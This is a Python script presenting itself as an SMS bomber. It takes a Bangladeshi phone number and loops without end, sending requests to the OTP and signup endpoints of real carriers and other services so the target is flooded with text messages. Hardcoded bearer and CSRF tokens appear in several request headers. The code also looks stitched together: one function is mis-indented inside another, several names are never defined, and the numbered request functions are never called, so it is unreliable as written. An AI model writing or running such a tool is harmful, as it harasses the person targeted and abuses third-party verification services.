import os
import time
import threading
import requests

PASSWORD = "fthasan"

def banner():
    os.system("clear")
    print(r"""\033[1;32m
 
           
╔═════════════════════════╗
║       💀 FT HASAN 💀        ║
╚═════════════════════════╝
██████╗░████████╗░░██╗██╗░░██╗
██╔══██╗╚══██╔══╝░██╔╝██║░██╔╝
██████╦╝░░░██║░░░██╔╝░█████═╝░
██╔══██╗░░░██║░░░████╗██╔═██╗░
██████╦╝░░░██║░░░╚██╔╝██║░╚██╗
╚═════╝░░░░╚═╝░░░░╚═╝░╚═╝░░╚═╝

                                                        
                                                        

                                                      
                                              
                                        
  FT HASAN BD SMS BOMBER v2.0
  fb/ft.hasan
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
    choice = input("Select an option: ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def get_target():
    number = input("Enter target number (01XXXXXXXXX): ")
    if number.startswith("01") and len(number) == 11:
        return number, "880" + number[1:]
    else:
        print("Invalid number format.")
        exit()

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

def fast_apis(phone, full):
    try:
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0")
        update_counter()
    except: pass

    try:
        requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}")
        update_counter()
    except: pass
        def lmnXlija_1(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'origin': 'https://go.paperfly.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'full_name': 'Johny Singh',
            'company_name': 'lmnxlija',
            'email_address': 'lmnxlija9689@gmail.com',
            'phone_number': number,
        }
        response = requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_2(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://ghoorilearning.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://ghoorilearning.com/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        params = {
            '_app_platform': 'web',
        }
        json_data = {
            'mobile_no': number,
        }
        response = requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params=params, headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_3(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://doctime.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://doctime.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'data': {
                'country_calling_code': '88',
                'contact_no': number,
                'headers': {
                    'PlatForm': 'Web',
                },
            },
        }
        response = requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data,)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        

def lmnXlija_4(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://customer.sundarbancourierltd.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://customer.sundarbancourierltd.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'operationName': 'CreateAccessToken',
            'variables': {
            'accessTokenFilter': {
                'userName': number,
            },
        },
            'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}',
        }
        response = requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        

def lmnXlija_5(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://apex4u.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://apex4u.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phoneNumber': number,
        }
        response = requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_6(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        url = "https://webapi.robi.com.bd/v1/send-otp"
        headers = {
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
            "Content-Type": "application/json",
        }
        data = {
            "phone_number": number,
            "type": "doorstep"
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_7(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        response = requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_8(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'mobile': number,
        }
        response = requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_9(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.grameenphone.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.grameenphone.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        data = {
            'msisdn': number,
        }
        response = requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers=headers, data=data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_10(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'phone_number': number,
            'type': 'my_offer',
        }
        response = requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_11(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        url = "https://da-api.robi.com.bd/da-nll/otp/send"
        data = {
            "msisdn": number
        }
        headers = {
            "Content-Type": "application/json",
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_12(number):#----------{"100% OK": "FFKING0011"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'phone_number': number,
            'name': 'Johny Singh',
            'type': 'video-chat',
        }
        response = requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        

def normal_apis(phone, full):
    apis = [
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {"phone": phone}),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
        ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
        ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
        ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
        ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
        ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
    ]

    for url, data in apis:
        try:
            requests.post(url, json=data)
            update_counter()
        except: pass

def start_bombing():
    phone, full = get_target()
    while True:
        threads = []

        for _ in range(3):
            t = threading.Thread(target=fast_apis, args=(phone, full))
            t.start()
            threads.append(t)

        t = threading.Thread(target=normal_apis, args=(phone, full))
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    banner()
    password_prompt()
    menu()
